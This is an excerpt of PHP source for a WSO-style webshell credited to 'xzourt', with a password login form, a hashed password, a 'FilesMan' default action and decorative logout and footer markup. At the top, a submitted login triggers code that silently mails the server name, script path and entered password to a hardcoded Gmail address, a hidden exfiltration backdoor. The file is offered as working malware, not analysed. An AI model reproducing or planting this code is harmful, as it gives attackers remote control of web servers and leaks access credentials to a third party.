...
if(array_key_exists('watching',$_POST)){
	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('namatukang5@gmail.com', 'root', $tmp); // Edit or delete!
}
$▛ = "0d7b3f28cb0f5cc23a74fccfa4d86c38";
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
...
function hardLogin() {
	...
	die("</br></br><pre align=center><form method=post style='font-family:Nunito, sans-serif;color:#1a1a1a; text-shadow: 2px 0 0 #0d52bf, -2px 0 0 #0d52bf, 0 2px 0 #0d52bf, 0 -2px 0 #0d52bf, 1px 1px #0d52bf, -1px -1px 0 #0d52bf, 1px -1px 0 #0d52bf, -1px 1px 0 #0d52bf; text-align: center;'><h3>Hello <br>Welcome to wso webshell designed by xzourt</h3><br><input placeholder='password' type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#0d52bf;color:#fff;cursor:pointer;'></form></pre>
...
function actionLogout() {
	...
	die("<div align='center'><div class='container'><div class='sky'><div class='text'>THANK YOU & BYE BRO!</div><div class='stars'></div><div class='stars1'></div><div class='stars2'></div><div class='shooting-stars'></div></div></div></div>
...
<marquee scrollamount='3' scrolldelay='60' width='80%'><b>Twepl & <a href='https://github.com/xzourt'>mIcHy</a> </b></marquee>  </font></font></font></footer>");
}
